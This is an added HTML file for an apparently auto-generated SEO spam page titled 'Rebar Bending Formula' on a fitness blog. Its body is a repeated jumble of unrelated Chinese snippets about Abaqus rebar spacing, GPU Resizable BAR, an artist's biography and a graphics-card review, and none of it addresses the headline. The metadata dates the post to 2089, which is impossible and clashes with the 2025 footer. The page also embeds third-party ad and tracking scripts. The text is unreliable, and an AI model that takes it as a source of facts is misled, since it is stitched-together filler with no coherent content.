@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta http-equiv="content-language" content="en-us">
+<title>Rebar Bending Formula - STREET WORKOUT</title>
+<meta name="description" content="Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r…..">
+<meta name="keywords" content="Rebar Bending Formula">
+<meta name="author" content="Petter"> 
+<meta property="article:author" content="Petter"> 
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="STREET WORKOUT">
+<meta property="og:title" content="Rebar Bending Formula - STREET WORKOUT">
+<meta property="og:image" content="https://tse1.mm.bing.net/th?q=rebar%20bending%20formula" >
+<meta property="og:description" content="Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r…..">
+<meta name="url" content="https://streetgym.github.io/rebar-bending-formula/">
+<meta property="og:url" content="https://streetgym.github.io/rebar-bending-formula/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="robots" content="All">
+<meta name="googlebot" content="index,follow">
+<meta name="googlebot-news" content="index,follow">
+<meta name="YahooSeeker" content="index,follow">
+<meta name="bingBOT" content="index,follow">
+<meta name="yandexbot" content="index,nofollow">
+<meta name="revisit-after" content="1 Days">             
+<meta name="RATING" content="GENERAL">
+<link rel="canonical" href="https://streetgym.github.io/rebar-bending-formula/">
+<link rel="preconnect" href="https://stackpath.bootstrapcdn.com">
+<link rel="dns-prefetch" href="https://stackpath.bootstrapcdn.com">
+<link rel="preconnect" href="https://code.jquery.com">
+<link rel="dns-prefetch" href="https://code.jquery.com">
+<link rel="preconnect" href="https://i.pinimg.com">
+<link rel="dns-prefetch" href="https://i.pinimg.com">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="dns-prefetch" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://streetgym.github.io/assets/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Lora:400,400i,700">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,400i,700">
+<link rel="stylesheet" href="https://streetgym.github.io/assets/css/main.css">
+<link rel="stylesheet" href="https://streetgym.github.io/assets/css/theme.css">
+<link rel="icon" href="/logo.png" type="image/png">
+<link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16 32x32">
+<link rel="shortcut icon" href="/favicon.ico">
+    <meta name="geo.region" content="US">
+<meta name="geo.region" content="GB">
+<meta name="geo.region" content="CA">
+<meta name="geo.region" content="AU">
+<meta name="geo.region" content="IT">
+<meta name="geo.region" content="NL">
+<meta name="geo.region" content="DE">
+
+
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "articleSection": "post",
+    "name": "Rebar Bending Formula",
+    "headline": "Rebar Bending Formula",
+    "alternativeHeadline": "",
+    "description": "Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r….",
+    "inLanguage": "en-us",
+    "isFamilyFriendly": "true",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https:\/\/streetgym.github.io\/rebar-bending-formula\/"
+    },
+    "author" : {
+        "@type": "Person",
+        "name": "Petter"
+    },
+    "creator" : {
+        "@type": "Person",
+        "name": "Petter"
+    },
+    "accountablePerson" : {
+        "@type": "Person",
+        "name": "Petter"
+    },
+    "copyrightHolder" : "STREET WORKOUT",
+    "copyrightYear" : "2089",
+    "dateCreated": "2089-10-13T01:39:28.00Z",
+    "datePublished": "2089-10-13T01:39:28.00Z",
+    "dateModified": "2089-10-13T01:39:28.00Z",
+    "publisher":{
+        "@type":"Organization",
+        "name": "STREET WORKOUT",
+        "url": "https://streetgym.github.io",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https:\/\/streetgym.github.io\/logo.png",
+            "width":"32",
+            "height":"32"
+        }
+    },
+    "image": ["https://tse1.mm.bing.net/th?q=rebar%20bending%20formula"],
+    "url" : "https:\/\/streetgym.github.io\/rebar-bending-formula\/",
+    "wordCount" : "162",
+    "genre" : [ "workout routine" ],
+    "keywords" : [ "Rebar" , "Bending" , "Formula" ]
+}
+</script>
+
+</head>
+  <body>    
+    <nav id="MagicMenu" class="topnav navbar navbar-expand-lg navbar-light bg-white fixed-top">
+    <div class="container">
+        <a class="navbar-brand" href="https://streetgym.github.io"><span style="text-transform: capitalize;font-weight: bold;">STREET WORKOUT</strong></a><button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+        <div class="navbar-collapse collapse" id="navbarColor02" style="">
+            <ul class="navbar-nav mr-auto d-flex align-items-center">
+               
+               <li class="nav-item"><a class="nav-link" href="https://streetgym.github.io/contact/">Contact</a></li>
+               <li class="nav-item"><a class="nav-link" href="https://streetgym.github.io/dmca/">Dmca</a></li>
+               <li class="nav-item"><a class="nav-link" href="https://streetgym.github.io/privacy-policy/">Privacy Policy</a></li>
+               <li class="nav-item"><a class="nav-link" href="https://streetgym.github.io/about/">About</a></li><li class="nav-item"><a class="nav-link" style="text-transform: capitalize;" href="https://streetgym.github.io/categories/cardio-and-fitness/" title="Cardio and Fitness">Cardio and Fitness</a></li></ul>
+        </div>
+    </div>
+    </nav>
+    <main role="main" class="site-content">
+<div class="container">
+<div class="jumbotron jumbotron-fluid mb-3 pl-0 pt-0 pb-0 bg-white position-relative">
+        <div class="h-100 tofront">
+            <div class="row justify-content-between ">
+                <div class=" col-md-6 pr-0 pr-md-4 pt-4 pb-4 align-self-center">
+                    <p class="text-uppercase font-weight-bold"><span class="catlist"><a class="sscroll text-danger" href="https://streetgym.github.io/categories/cardio-and-fitness"/>Cardio and Fitness</a> . </span></p>
+                    <h1 class="display-4 mb-4 article-headline">Rebar Bending Formula</h1>
+                    <div class="d-flex align-items-center">
+                        <small class="ml-3">Written by Petter <span class="text-muted d-block mt-1">Oct 13, 2089 · <span class="reading-time">1 min read</span></span></small>
+                    </div>
+                </div>
+                <div class="col-md-6 pr-0 align-self-center">
+                    <img class="rounded" src="https://tse1.mm.bing.net/th?q=rebar%20bending%20formula" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';" alt="Rebar Bending Formula"/>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container-lg pt-4 pb-4">
+    <div class="row justify-content-center">
+        <div class="col-md-12 col-lg-8">
+            <article class="article-post">
+            <p>
+            <div class="d-block p-4">
+	<center>
+		<script src="https://droidrone.github.io/catbox.js"></script>
+	</center>
+</div>
+
+            </p><p>刘诗园生于中国北京，现生活于北京及丹麦哥本哈根， 2012年毕业于纽约视觉艺术学院 2018年，她在tanya画廊的个展中展出了一系列still image (静止图片作品)，这一系列名. 一般考虑各向同性，木构架材料属性如下： 弹性模量:15.5×10e9 pa 密度:3766kg/m3 泊松比:0.25 也可以根据不同的木材考虑 各向异性，使用abaqus的四边形双线性单元（cps4r） 如果考虑. Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r…. 英伟达 gtx 16 和 rtx 20 系显卡现可开启 rebar 功能，哪款显卡性能更好？ it之家 3 月 11 日消息，rebar（resizingbar）是一项标准化的 pci express 接口技术，可以解锁 cpu 访问. Resizable bar (rebar) 技术的引入，rebar允许cpu（以及潜在的其他pcie设备）访问gpu的全部显存，而不是仅限于小的bar窗口。 例如，在拥有24gb显存的rtx 3090/4090上启. @知乎好物 100 启动全新「新品测评」栏目，本期联合 @知乎数码 测评产品「蓝戟 intel arc b580 photon w.</p>
+<section>
+        <h3>英伟达 Gtx 16 和 Rtx 20 系显卡现可开启 Rebar 功能，哪款显卡性能更好？ It之家 3 月 11 日消息，Rebar（Resizingbar）是一项标准化的 Pci Express 接口技术，可以解锁 Cpu 访问.</h3>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=%E8%8B%B1%E4%BC%9F%E8%BE%BE%20Gtx%2016%20%E5%92%8C%20Rtx%2020%20%E7%B3%BB%E6%98%BE%E5%8D%A1%E7%8E%B0%E5%8F%AF%E5%BC%80%E5%90%AF%20Rebar%20%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%93%AA%E6%AC%BE%E6%98%BE%E5%8D%A1%E6%80%A7%E8%83%BD%E6%9B%B4%E5%A5%BD%EF%BC%9F%20It%E4%B9%8B%E5%AE%B6%203%20%E6%9C%88%2011%20%E6%97%A5%E6%B6%88%E6%81%AF%EF%BC%8CRebar%EF%BC%88Resizingbar%EF%BC%89%E6%98%AF%E4%B8%80%E9%A1%B9%E6%A0%87%E5%87%86%E5%8C%96%E7%9A%84%20Pci%20Express%20%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%94%81%20Cpu%20%E8%AE%BF%E9%97%AE.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=%E8%8B%B1%E4%BC%9F%E8%BE%BE%20Gtx%2016%20%E5%92%8C%20Rtx%2020%20%E7%B3%BB%E6%98%BE%E5%8D%A1%E7%8E%B0%E5%8F%AF%E5%BC%80%E5%90%AF%20Rebar%20%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%93%AA%E6%AC%BE%E6%98%BE%E5%8D%A1%E6%80%A7%E8%83%BD%E6%9B%B4%E5%A5%BD%EF%BC%9F%20It%E4%B9%8B%E5%AE%B6%203%20%E6%9C%88%2011%20%E6%97%A5%E6%B6%88%E6%81%AF%EF%BC%8CRebar%EF%BC%88Resizingbar%EF%BC%89%E6%98%AF%E4%B8%80%E9%A1%B9%E6%A0%87%E5%87%86%E5%8C%96%E7%9A%84%20Pci%20Express%20%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%94%81%20Cpu%20%E8%AE%BF%E9%97%AE.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+    <br/>
+        <p>一般考虑各向同性，木构架材料属性如下： 弹性模量:15.5×10e9 pa 密度:3766kg/m3 泊松比:0.25 也可以根据不同的木材考虑 各向异性，使用abaqus的四边形双线性单元（cps4r） 如果考虑. Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r…. @知乎好物 100 启动全新「新品测评」栏目，本期联合 @知乎数码 测评产品「蓝戟 intel arc b580 photon w.</p>
+            <h3>Resizable Bar (Rebar) 技术的引入，Rebar允许Cpu（以及潜在的其他Pcie设备）访问Gpu的全部显存，而不是仅限于小的Bar窗口。 例如，在拥有24Gb显存的Rtx 3090/4090上启.</h3>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=Resizable%20Bar%20%28Rebar%29%20%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BC%95%E5%85%A5%EF%BC%8CRebar%E5%85%81%E8%AE%B8Cpu%EF%BC%88%E4%BB%A5%E5%8F%8A%E6%BD%9C%E5%9C%A8%E7%9A%84%E5%85%B6%E4%BB%96Pcie%E8%AE%BE%E5%A4%87%EF%BC%89%E8%AE%BF%E9%97%AEGpu%E7%9A%84%E5%85%A8%E9%83%A8%E6%98%BE%E5%AD%98%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E4%BB%85%E9%99%90%E4%BA%8E%E5%B0%8F%E7%9A%84Bar%E7%AA%97%E5%8F%A3%E3%80%82%20%E4%BE%8B%E5%A6%82%EF%BC%8C%E5%9C%A8%E6%8B%A5%E6%9C%8924Gb%E6%98%BE%E5%AD%98%E7%9A%84Rtx%203090%2F4090%E4%B8%8A%E5%90%AF.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+    <br/>
+        <p>刘诗园生于中国北京，现生活于北京及丹麦哥本哈根， 2012年毕业于纽约视觉艺术学院 2018年，她在tanya画廊的个展中展出了一系列still image (静止图片作品)，这一系列名.</p>
+    </section>
+<section>
+        <h3>英伟达 Gtx 16 和 Rtx 20 系显卡现可开启 Rebar 功能，哪款显卡性能更好？ It之家 3 月 11 日消息，Rebar（Resizingbar）是一项标准化的 Pci Express 接口技术，可以解锁 Cpu 访问.</h3>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=%E8%8B%B1%E4%BC%9F%E8%BE%BE%20Gtx%2016%20%E5%92%8C%20Rtx%2020%20%E7%B3%BB%E6%98%BE%E5%8D%A1%E7%8E%B0%E5%8F%AF%E5%BC%80%E5%90%AF%20Rebar%20%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%93%AA%E6%AC%BE%E6%98%BE%E5%8D%A1%E6%80%A7%E8%83%BD%E6%9B%B4%E5%A5%BD%EF%BC%9F%20It%E4%B9%8B%E5%AE%B6%203%20%E6%9C%88%2011%20%E6%97%A5%E6%B6%88%E6%81%AF%EF%BC%8CRebar%EF%BC%88Resizingbar%EF%BC%89%E6%98%AF%E4%B8%80%E9%A1%B9%E6%A0%87%E5%87%86%E5%8C%96%E7%9A%84%20Pci%20Express%20%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%94%81%20Cpu%20%E8%AE%BF%E9%97%AE.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=%E8%8B%B1%E4%BC%9F%E8%BE%BE%20Gtx%2016%20%E5%92%8C%20Rtx%2020%20%E7%B3%BB%E6%98%BE%E5%8D%A1%E7%8E%B0%E5%8F%AF%E5%BC%80%E5%90%AF%20Rebar%20%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%93%AA%E6%AC%BE%E6%98%BE%E5%8D%A1%E6%80%A7%E8%83%BD%E6%9B%B4%E5%A5%BD%EF%BC%9F%20It%E4%B9%8B%E5%AE%B6%203%20%E6%9C%88%2011%20%E6%97%A5%E6%B6%88%E6%81%AF%EF%BC%8CRebar%EF%BC%88Resizingbar%EF%BC%89%E6%98%AF%E4%B8%80%E9%A1%B9%E6%A0%87%E5%87%86%E5%8C%96%E7%9A%84%20Pci%20Express%20%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%94%81%20Cpu%20%E8%AE%BF%E9%97%AE.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+    <br/>
+        <p>刘诗园生于中国北京，现生活于北京及丹麦哥本哈根， 2012年毕业于纽约视觉艺术学院 2018年，她在tanya画廊的个展中展出了一系列still image (静止图片作品)，这一系列名. Abaqus 中rebar截面参数的spcing。 ？ spacing是指钢筋之间的间隔，是圆心与圆心还是圆周与圆周的间隔？ 比如两根紧紧挨着的10mm粗的钢筋，那么这个spacing填10还是0？ 还有就是r…. Resizable bar (rebar) 技术的引入，rebar允许cpu（以及潜在的其他pcie设备）访问gpu的全部显存，而不是仅限于小的bar窗口。 例如，在拥有24gb显存的rtx 3090/4090上启.</p>
+            <h3>@知乎好物 100 启动全新「新品测评」栏目，本期联合 @知乎数码 测评产品「蓝戟 Intel Arc B580 Photon W.</h3>
+<center>
+    <img class="v-cover ads-img" src="https://tse1.mm.bing.net/th?q=%40%E7%9F%A5%E4%B9%8E%E5%A5%BD%E7%89%A9%20100%20%E5%90%AF%E5%8A%A8%E5%85%A8%E6%96%B0%E3%80%8C%E6%96%B0%E5%93%81%E6%B5%8B%E8%AF%84%E3%80%8D%E6%A0%8F%E7%9B%AE%EF%BC%8C%E6%9C%AC%E6%9C%9F%E8%81%94%E5%90%88%20%40%E7%9F%A5%E4%B9%8E%E6%95%B0%E7%A0%81%20%E6%B5%8B%E8%AF%84%E4%BA%A7%E5%93%81%E3%80%8C%E8%93%9D%E6%88%9F%20Intel%20Arc%20B580%20Photon%20W.%2C%20workout&w=1280&h=720&c=5&rs=1&p=0" alt="" width="100%" style="margin-right: 8px;margin-bottom: 8px;" />
+    <br/>
+</center>
+    <br/>
+        <p>一般考虑各向同性，木构架材料属性如下： 弹性模量:15.5×10e9 pa 密度:3766kg/m3 泊松比:0.25 也可以根据不同的木材考虑 各向异性，使用abaqus的四边形双线性单元（cps4r） 如果考虑.</p>
+    </section>
+</article>
+             
+
+<div class="d-block p-4">
+	<center>
+		<script type="text/javascript">
+	atOptions = {
+		'key' : 'e5fc6955ca5c6f8ecda67073641726f3',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//invaderelevant.com/e5fc6955ca5c6f8ecda67073641726f3/invoke.js"></script>
+	</center>
+</div>
+
+            <div class="row"><div class="posts-image" style="width:50%;"><a style="margin:5px;" href="/what-is-the-meaning-of-training-program/">&laquo;&laquo;&nbsp;What Is The Meaning Of Training Program</a></div>
+    <div class="posts-image" style="width:50%"><a style="margin:5px;" href="/best-yoga-pants-on-amazon-canada/">Best Yoga Pants On Amazon Canada&nbsp;&raquo;&raquo;</a></div></div>
+            
+            <div class="mb-4">
+                <span class="taglist"></span>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+<div class="container pt-4 pb-4">
+    
+    <h5 class="font-weight-bold spanborder"><span>Trending Article: </span></h5>
+    <div class="row">
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/program-for-gym-to-gain-weight/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=program%20for%20gym%20to%20gain%20weight" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/program-for-gym-to-gain-weight/">Program For Gym To Gain Weight</a>
+                        </h2>
+                        <small class="text-muted">Jun 04 . 1 min read</small>
+                    </div>
+                </div>
+        </div>
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/training-program-for-stationary-bike/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=training%20program%20for%20stationary%20bike" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/training-program-for-stationary-bike/">Training Program For Stationary Bike</a>
+                        </h2>
+                        <small class="text-muted">Oct 06 . 3 min read</small>
+                    </div>
+                </div>
+        </div>
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/does-pilates-actually-tone-your-body-reddit/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=does%20pilates%20actually%20tone%20your%20body%20reddit" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/does-pilates-actually-tone-your-body-reddit/">Does Pilates Actually Tone Your Body Reddit</a>
+                        </h2>
+                        <small class="text-muted">Oct 06 . 3 min read</small>
+                    </div>
+                </div>
+        </div>
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/3-days-a-week-gym-routine-women/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=3%20days%20a%20week%20gym%20routine%20women" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/3-days-a-week-gym-routine-women/">3 Days A Week Gym Routine Women</a>
+                        </h2>
+                        <small class="text-muted">Mar 09 . 1 min read</small>
+                    </div>
+                </div>
+        </div>
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/yes-meaning-in-indonesia/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=yes%20meaning%20in%20indonesia" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/yes-meaning-in-indonesia/">Yes Meaning In Indonesia</a>
+                        </h2>
+                        <small class="text-muted">Dec 09 . 1 min read</small>
+                    </div>
+                </div>
+        </div>
+        <div class="col-lg-6">
+                <div class="mb-3 d-flex align-items-center">
+                    <a href="/how-to-gain-muscle-fast-workout/"><img height="80" src="/img/placeholder.svg" data-src="https://tse1.mm.bing.net/th?q=how%20to%20gain%20muscle%20fast%20workout" onerror="this.onerror=null;this.src='https:\/\/streetgym.github.io\/img\/placeholder.svg';"/></a>
+                    <div class="pl-3">
+                        <h2 class="mb-2 h6 font-weight-bold">
+                        <a class="text-dark" href="/how-to-gain-muscle-fast-workout/">How To Gain Muscle Fast Workout</a>
+                        </h2>
+                        <small class="text-muted">Nov 23 . 3 min read</small>
+                    </div>
+                </div>
+        </div>
+</div>
+</div>
+</div>
+    </main>    <script async="async" src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+    <script async="async" src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+    <script async="async" src="https://streetgym.github.io/assets/js/theme.js"></script>
+    <script>function init(){var imgDefer=document.getElementsByTagName('img');for (var i=0; i<imgDefer.length; i++){if(imgDefer[i].getAttribute('data-src')){imgDefer[i].setAttribute('src',imgDefer[i].getAttribute('data-src'));}}}window.onload=init;</script>
+    
+    <footer class="bg-white border-top p-3 text-muted small">
+        <div class="container">
+        <div class="row align-items-center justify-content-between">
+            <div><span style="text-transform: capitalize;"><a href="https://streetgym.github.io">STREET WORKOUT</a> Copyright &copy; 2025.</span></div>
+            
+        </div>
+        </div>
+    </footer> 
+
+<div class="d-block p-4">
+	<center>
+		<script type="text/javascript">
+	atOptions = {
+		'key' : 'e5fc6955ca5c6f8ecda67073641726f3',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//invaderelevant.com/e5fc6955ca5c6f8ecda67073641726f3/invoke.js"></script>
+	</center>
+</div>
+
+
+<script type="text/javascript">
+var sc_project=12871439; 
+var sc_invisible=1; 
+var sc_security="cb50c2f3"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="free web stats"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/12871439/0/cb50c2f3/1/"
+alt="free web stats"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+
+  </body>
+</html>
